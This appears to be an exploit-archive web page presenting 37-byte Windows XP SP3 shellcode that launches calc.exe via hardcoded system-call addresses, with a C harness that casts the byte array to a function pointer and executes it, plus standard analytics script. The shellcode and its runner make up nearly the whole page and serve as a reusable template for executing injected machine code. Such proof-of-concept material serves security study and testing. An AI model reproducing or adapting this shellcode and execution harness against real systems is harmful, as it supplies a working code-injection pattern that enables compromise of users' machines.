<html><head><title>Windows - SP3 english ( calc.exe ) - 37 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
* Windows Xp Home edition SP3 english ( calc.exe ) 37 bytes shellcode
* by: Hazem mofeed
* The Shellcode: http://www.exploit-db.com/exploits/11598
* Modified to working In SP3,
* Home: www.pentestlabs.com
* greetz: ProViDoR , ExH , rUnVirUs , Sinaritx , Data_fr34k3r , Br1ght D@rk
*/
 
char evil[] =
&quot;\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0&quot;
&quot;\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c&quot;
&quot;\x63\x2e\x65\x78\x65\x00&quot;;
 
int main(int argc, char **argv)
{
int (*shellcode)();
shellcode = (int (*)()) evil;
(int)(*shellcode)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
